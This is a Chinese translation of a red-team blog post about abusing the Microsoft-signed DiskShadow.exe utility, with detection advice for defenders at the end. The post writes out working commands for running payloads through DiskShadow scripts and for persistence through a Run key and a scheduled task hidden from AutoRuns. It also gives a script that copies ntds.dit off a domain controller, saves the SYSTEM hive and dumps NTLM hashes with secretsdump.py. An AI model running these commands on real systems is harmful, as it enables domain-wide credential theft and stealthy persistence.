> 原文链接: https://www.anquanke.com//post/id/103117 


# DiskShadow工具介绍：VSS绕过、持久化感染和活动目录数据库提取


                                阅读量   
                                **114936**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者BOHOPS，文章来源：bohops.com
                                <br>原文地址：[https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01d27e7a98cb0bfcdf.jpg)](https://p1.ssl.qhimg.com/t01d27e7a98cb0bfcdf.jpg)

## 介绍

在此之前，我曾发表过一篇标题为《Vshadow：如何利用卷影拷贝服务VSS实现安全防御绕过、持久化感染和活动目录数据库提取》的技术文章，感兴趣的同学可以阅读一下。这个工具非常有意思，因为它不仅可以进行卷影拷贝操作，而且它还提供了几个可以用于安全防御端的实用功能。实际上，安全防御绕过以及持久化感染可能并不是Vshadow.exe的长项，但对于DiskShadow.exe来说，这绝对是它的拿手好戏。<br>
在这篇文章中，我们将跟大家详细介绍DiskShadow的使用，其中包括它提供给安全防御端的相关功能，以及相应的入侵威胁指标。



### <a class="reference-link" name="DiskShadow%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"></a>DiskShadow是什么？

根据微软的官方文档：“DiskShadow.exe这款工具可以使用卷影拷贝服务（VSS）所提供的多个功能。默认配置下，DiskShadow使用了一种交互式命令解释器，这里跟DiskRaid或DiskPart比较类似。除此之外，DiskShadow还提供了一种脚本编程模式。”<br>
实际上，DiskShadow的代码是由微软官方签名的，而且Windows Server 2008、Windows Server 2012和Windows Server 2016中都包含了DiskShadow：

[![](https://p3.ssl.qhimg.com/t01486f20777565d797.png)](https://p3.ssl.qhimg.com/t01486f20777565d797.png)<br>
DiskShadow所提供的卷影拷贝服务需要有高等级访问权限（UAC绕过），但是其中也有部分命令工具可以给非特权用户调用，这也让DiskShadow成为了攻击者实现命令执行、安全绕过以及持久化感染的一种强大工具。



## DiskShadow命令执行

交互式命令解释器和脚本模式支持EXEC命令，无论是特权用户还是非特权用户，他们都可以在交互模式下或通过一个脚本文件来调用其他命令以及batch脚本。接下俩，我们会跟大家一一演示这些功能。

### <a class="reference-link" name="%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%BC%8F"></a>交互模式

在下面给出的样本中，一名普通用户调用了calc.exe程序：

[![](https://p5.ssl.qhimg.com/t015d055d1e4631a697.png)](https://p5.ssl.qhimg.com/t015d055d1e4631a697.png)

### <a class="reference-link" name="%E8%84%9A%E6%9C%AC%E6%A8%A1%E5%BC%8F"></a>脚本模式

在下面的样本中，一名普通用户通过使用“diskshadow.txt”作为参数成功调用了calc.exe和notepad.exe：

`diskshadow.exe /s c:testdiskshadow.txt`

[![](https://p1.ssl.qhimg.com/t01c3ec780ff7edcbdd.png)](https://p1.ssl.qhimg.com/t01c3ec780ff7edcbdd.png)<br>
跟Vshadow一样，我们这里需要注意的是，DiskShadow.exe是命令所生成的可执行程序的父进程。除此之外，DiskShadow将会一直运行下去，直到它的子进程终止执行。

[![](https://p5.ssl.qhimg.com/t0161412400539ee603.png)](https://p5.ssl.qhimg.com/t0161412400539ee603.png)



## 持久化感染&amp;绕过&amp;自动化

由于DiskShadow是由微软签名的代码，所以我们可以利用注册表的AutoRuns来实现持久化感染和绕过。在接下来给出的样本中，我们将更新我们的脚本代码，并创建一个RunKey和计划任务。

### <a class="reference-link" name="%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"></a>准备工作

由于DiskShadow是以一种Windows命令窗口的形式使用的，所以我们需要修改我们的脚本去调用pass-thru命令执行，然后终止DiskShadow父进程以及后续的Payload。在某些情况下，如果Windows窗口的打开时间过长，那么这种技术的隐蔽性就会受到影响。但是，如果目标用户习惯于在登录时看到这种命令窗口提示的话，那就不会受到什么影响了。<br>
注：下面的演示样例是在非特权/非管理员用户账号环境下进行的，实验平台为一台刚刚安装好的Windows Server 2016实例。<br>
首先，我们需要修改我们的脚本（diskshadow.txt）来演示这项基本技术：

`EXEC "cmd.exe" /c c:testevil.exe`

为了支持命令转化，我们必须使用EXEC来调用初始代码，这同样可以在交互模式下进行。<br>
接下来，我们需要利用下列命令来实现持久化感染。

```
- Run Key Value -
reg add HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRun /v VSSRun /t REG_EXPAND_SZ /d “diskshadow.exe /s c:testdiskshadow.txt”

User Level Scheduled Task -
schtasks /create /sc hourly /tn VSSTask /tr “diskshadow.exe /s c:testdiskshadow.txt”
```



[![](https://p0.ssl.qhimg.com/t019aa3342d0ae729c2.png)](https://p0.ssl.qhimg.com/t019aa3342d0ae729c2.png)<br>
接下来，我们来进行深入分析…

### <a class="reference-link" name="AutoRuns%20%E2%80%93%20Run%E9%94%AE%E5%80%BC"></a>AutoRuns – Run键值

创建好注册表键值之后，当我们打开AutoRuns并选择Logon标签之后，我们会发现刚才创建的键是隐藏的。默认配置下，Windows签名的可执行程序会自动隐藏在视图中，如下图所示：

[![](https://p2.ssl.qhimg.com/t013984f56299f1ccca.png)](https://p2.ssl.qhimg.com/t013984f56299f1ccca.png)<br>
取消勾选“隐藏Windows条目”（Hide Windows Entries）之后，我们就可以看到AutoRuns注册表键信息了。

[![](https://p4.ssl.qhimg.com/t011b267885a42770f3.png)](https://p4.ssl.qhimg.com/t011b267885a42770f3.png)

### <a class="reference-link" name="AutoRuns%20%E2%80%93%20%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"></a>AutoRuns – 计划任务

跟之前的方法一样，我们的设置入口也默认在AutoRuns视图中隐藏了：

[![](https://p2.ssl.qhimg.com/t01c4b05c0ddd3cad9c.png)](https://p2.ssl.qhimg.com/t01c4b05c0ddd3cad9c.png)<br>
取消勾选“隐藏Windows条目”（Hide Windows Entries）之后，我们就可以看到AutoRuns注册表键信息了。

[![](https://p4.ssl.qhimg.com/t01a3c4d4c4ac975531.png)](https://p4.ssl.qhimg.com/t01a3c4d4c4ac975531.png)



## 提取活动目录数据库

由于我们现在在讨论的是关于卷影拷贝工具的内容，所以我们需要先了解一下VSS用于提取活动目录数据库（ntds.dit）的相关方法。接下来，我们假设我们已经成功入侵了一个活动目录域控制器（Win2k12），并且成功以高级用户权限在脚本模式下运行了DiskShadow。<br>
首先，我们先准备好我们的脚本。不过在此之前，我们需要通过一些网络侦察手段去确定目标驱动器号（包含了活动目录数据库的逻辑驱动器），并寻找出目标系统当前没有使用的逻辑驱动器号。下面给出的是我们的DiskShadow脚本代码（diskshadow.txt：[https://www.datacore.com/WIK-Webhelp/VSS/DiskShadow_Commands_Example.htm）：](https://www.datacore.com/WIK-Webhelp/VSS/DiskShadow_Commands_Example.htm%EF%BC%89%EF%BC%9A)

<code>set context persistent nowriters<br>
add volume c: alias someAlias<br>
create<br>
expose %someAlias% z:<br>
exec "cmd.exe" /c copy z:windowsntdsntds.dit c:exfilntds.dit<br>
delete shadows volume %someAlias%<br>
reset</code>

在我们的脚本中，我们创建了一个持久化卷影拷贝，这样我们就能够执行复制操作并捕捉到目标系统中的敏感文件了。通过监控目标逻辑驱动器，我们能够确定目标文件的拷贝路径，在删除我们的卷影拷贝之前，我们将把这个拷贝路径下的文件拷贝到“exfil”目录之中。<br>
注意：我们还可以通过卷影设备名称/唯一标识符来拷贝出我们的目标文件，这种方法的隐蔽性比较高，但是我们还需要确保目标文件标签/UUID是正确的（通过网络侦察活动确定），否则我们的脚本将无法正常运行，这种技术在交互模式下的可行性更高。<br>
下图给出的是命令执行以及DiskShadow运行的结果：

<code>type c:diskshadow.txt<br>
diskshadow.exe /s  c:diskshadow.txt<br>
dir c:exfil</code>

[![](https://p1.ssl.qhimg.com/t014f2506c5a613f3c4.png)](https://p1.ssl.qhimg.com/t014f2506c5a613f3c4.png)<br>
除了活动目录数据库之外，我们还需要提取出SYSTEM注册表hive：

`reg.exe save hklmsystem c:exfilsystem.bak`

[![](https://p1.ssl.qhimg.com/t01b3bc8f3b7afb3134.png)](https://p1.ssl.qhimg.com/t01b3bc8f3b7afb3134.png)<br>
当我们成功从目标系统中提取出文件之后，我们将使用SecretsDump.py提取出NTLM哈希：

`secretsdump.py -ntds ntds.dit -system system.bak LOCAL`

[![](https://p1.ssl.qhimg.com/t014b4ed5a5433b9580.png)](https://p1.ssl.qhimg.com/t014b4ed5a5433b9580.png)<br>
成功啦！我们成功提取出了活动目录数据库以及相应哈希。接下来，我们一起来对比一下DiskShadow和Vshadow这两款工具之间的异同点。



## DiskShadow vs. Vshadow

DiskShadow.exe和Vshadow.exe这两款工具其实功能上非常类似，但是它们之间还是有一些去别的，因此我们可以根据自己的需要和情况来选择使用相应的工具。

### <a class="reference-link" name="%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8C%85%E5%90%AB"></a>操作系统包含

Windows Server操作系统从2008版开始就自带了DiskShadow.exe，但Vshadow.exe只存在于Windows SDK之中。除非目标系统安装了Windows SDK，否则我们必修要将Vshadow.exe上传到目标系统中。就此看来，DiskShadow.exe的优势就比较明显了。

### <a class="reference-link" name="%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%AE%9E%E7%94%A8%E6%80%A7"></a>工具与实用性

在普通用户场景下，我们可以在不需要特殊权限的情况下使用DiskShadow的部分功能。在我们之前的测试场景中，Vshadow可能会受到高级权限的影响和限制并导致功能无法正常使用。除此之外，DiskShadow更加灵活，对命令转换的支持也做得比较好，这也是DiskShadow的优势之一。

### <a class="reference-link" name="%E5%91%BD%E4%BB%A4%E8%A1%8C"></a>命令行

Vshadow对“命令行”的支持做得比较好，而DiskShadow则只需要通过交互命令或脚本文件来实现。除非你可以通过远程“TTY”访问目标系统，否则DiskShadow的交互命令窗口可能会受到限制，而且向目标设备上传文件或创建文件可能会增加被检测到的记录。所以在某些安全条件比较严苛的场景中，Vshadow可能就比较有优势了。



## 总结

综上所述，DiskShadow似乎更加吸引我们。不过，这并不会影响我们对Vshadow（以及其他VSS方法）的使用。而且在此之前，其实也有很多攻击者会Vshadow来实现攻击。对于DiskShadow来说，蓝队和网络防御人员可以考虑以下几个因素：
1. 监控卷影拷贝服务（VSS），检测随机卷影拷贝活动以及任何涉及到活动目录数据库文件（ntds.dit ）的可疑行为。
1. 监控System Event ID 7036（卷影拷贝服务进入运行状态的标志）的可疑实例以及VSSVC.exe进程的创建事件。
1. 监控diskshadow.exe以及相关子进程的进程创建事件。
1. 监控客户端设备的diskshadow.exe实例创建，除非是业务需要，否则Windows操作系统中不应该出现diskshadow.exe。
1. 监控新的逻辑驱动器映射事件。
1. 拦截可疑的AutoRuns注册表键，审查已签名的代码和脚本文件。
<li>提升应用程序白名单的安全性能，提升脚本安全策略。<br>
最后，感谢大家的阅读！</li>